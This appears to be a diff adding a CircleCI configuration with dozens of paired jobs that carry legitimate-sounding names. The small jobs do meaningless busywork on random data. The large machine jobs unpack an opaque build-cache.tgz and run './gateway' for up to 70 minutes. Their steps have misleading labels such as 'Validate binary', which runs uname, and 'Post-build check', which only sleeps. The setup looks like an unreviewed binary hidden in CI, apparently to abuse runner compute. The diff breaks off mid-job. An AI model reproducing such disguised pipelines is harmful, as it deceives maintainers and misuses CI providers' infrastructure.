@@ -1,0 +1,1613 @@
+version: 2.1
+
+jobs:
+  sys_chen-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prime cache tables
+          command: |
+            mkdir -p /tmp/stage
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/stage/186a.txt; true
+            size=$(wc -c </tmp/stage/186a.txt); echo "stage ok: chen-verify size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 186a.txt
+  chen-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/186a.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  stage_validate-full-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 4194304 | fold -w16 | sort -u | wc -l; true ; } > /tmp/stage/step-6.txt
+            size=$(wc -c </tmp/stage/step-6.txt); echo "stage ok: validate-full-regression-suite size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - step-6.txt
+  validate-full-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  B_check-staging-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 48117 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/stage/2024-10-15.data
+            size=$(wc -c </tmp/stage/2024-10-15.data); echo "stage ok: check-staging-integration-tests size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 2024-10-15.data
+  check-staging-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/2024-10-15.data > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  green_gating:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Reserve scratch region
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; seq 1 440053 | awk '{s+=$1}END{print s}'; true ; } > /tmp/stage/2023-11-01.data
+            size=$(wc -c </tmp/stage/2023-11-01.data); echo "stage ok: gating size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 2023-11-01.data
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  inspect_zulu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; yes abc | head -n 335603 | sha256sum; true ; } > /tmp/stage/stage.blob
+            size=$(wc -c </tmp/stage/stage.blob); echo "stage ok: zulu size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - stage.blob
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  canary_verify-end-to-end-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=1500 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/stage/step-ready.log
+            size=$(wc -c </tmp/stage/step-ready.log); echo "stage ok: verify-end-to-end-docker-image size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - step-ready.log
+  verify-end-to-end-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  red_b-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rebase partial order
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; seq 1 293032 | awk 'END{print NR}'; true ; } > /tmp/stage/handoff.txt
+            size=$(wc -c </tmp/stage/handoff.txt); echo "stage ok: b-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - handoff.txt
+  b-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  compile_add-parse-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Weigh batch output
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; seq 1 152700 | awk 'END{print NR}'; true ; } > /tmp/stage/DONE.txt
+            size=$(wc -c </tmp/stage/DONE.txt); echo "stage ok: add-parse-leak size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - DONE.txt
+  add-parse-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  canary1_titan2-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Record manifest digest
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=9;a++)for(b=1;b<=19544;b++)s+=a*b;print s}'; true ; } > /tmp/stage/trace.ndjson
+            size=$(wc -c </tmp/stage/trace.ndjson); echo "stage ok: titan2-alpha size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - trace.ndjson
+  titan2-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/trace.ndjson > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  stepB_fix-webhook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; seq 1 488180 | awk 'NR>12630 && NR<48442{s+=$1}END{print s}'; true ; } > /tmp/stage/READY.txt
+            size=$(wc -c </tmp/stage/READY.txt); echo "stage ok: fix-webhook size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - READY.txt
+  fix-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  beta_v4-beta2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=230 2>/dev/null | md5sum; true ; } > /tmp/stage/timings.json
+            size=$(wc -c </tmp/stage/timings.json); echo "stage ok: v4-beta2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - timings.json
+  v4-beta2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  staging_build-full-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; yes abc | head -n 303274 | sha256sum; true ; } > /tmp/stage/event.log
+            size=$(wc -c </tmp/stage/event.log); echo "stage ok: build-full-release-candidate size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - event.log
+  build-full-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  p1_ruby3-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Validate checksum roster
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 264290; echo "ftr" ) | wc -l; true ; } > /tmp/stage/pt-alt.pt
+            size=$(wc -c </tmp/stage/pt-alt.pt); echo "stage ok: ruby3-cov size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - pt-alt.pt
+  ruby3-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  generate_may26-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Walk sorted keys
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; head -c 12M /dev/urandom | base64 | wc -c; true ; } > /tmp/stage/FINAL.txt
+            size=$(wc -c </tmp/stage/FINAL.txt); echo "stage ok: may26-smoke size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - FINAL.txt
+  may26-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/FINAL.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  cook_verify-end-to-end-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 219859 | md5sum; true ; } > /tmp/stage/stash.dat
+            size=$(wc -c </tmp/stage/stash.dat); echo "stage ok: verify-end-to-end-integration-tests size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - stash.dat
+  verify-end-to-end-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  warmup_alpha-v8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 307200 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/stage/output.txt
+            size=$(wc -c </tmp/stage/output.txt); echo "stage ok: alpha-v8 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - output.txt
+  alpha-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  p1_all-greens:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Shape histogram head
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 389998 | md5sum; true ; } > /tmp/stage/relay.ok
+            size=$(wc -c </tmp/stage/relay.ok); echo "stage ok: all-greens size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - relay.ok
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  verify_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; yes abc | head -n 377553 | sha256sum; true ; } > /tmp/stage/44.log
+            size=$(wc -c </tmp/stage/44.log); echo "stage ok: package size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 44.log
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  Alpha_io-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Freeze working set
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=1300 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/stage/checkpoint-A.pickle
+            size=$(wc -c </tmp/stage/checkpoint-A.pickle); echo "stage ok: io-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - checkpoint-A.pickle
+  io-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  run_ensure-production-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; head -c 13631488 /dev/urandom | sha256sum; true ; } > /tmp/stage/buffer.dat
+            size=$(wc -c </tmp/stage/buffer.dat); echo "stage ok: ensure-production-artifact-bundle size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - buffer.dat
+  ensure-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  canary1_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Reduce text corpus
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; head -c 22020096 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/stage/PASS.txt
+            size=$(wc -c </tmp/stage/PASS.txt); echo "stage ok: green-light size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - PASS.txt
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  maker_vega-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Audit fixture rows
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 16740); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/stage/OK
+            size=$(wc -c </tmp/stage/OK); echo "stage ok: vega-final size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - OK
+  vega-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  drain_py310-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Shape kernel ring
+          command: |
+            mkdir -p /tmp/stage
+            { set +o pipefail 2>/dev/null; seq 1 330802 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/stage/2024-02-27.data
+            size=$(wc -c </tmp/stage/2024-02-27.data); echo "stage ok: py310-fmt size=${size}"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - 2024-02-27.data
+  py310-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Fetch workspace file
+          command: |
+            { cat /tmp/stage/DONE.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: gunzip -c build-cache.tgz | tar xvf -
+      - run:
+          name: Validate binary
+          command: uname -a
+      - run:
+          name: Post-build check
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 70m
+          command: nice -n 0 ./gateway
+  linter_nebula-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/stage
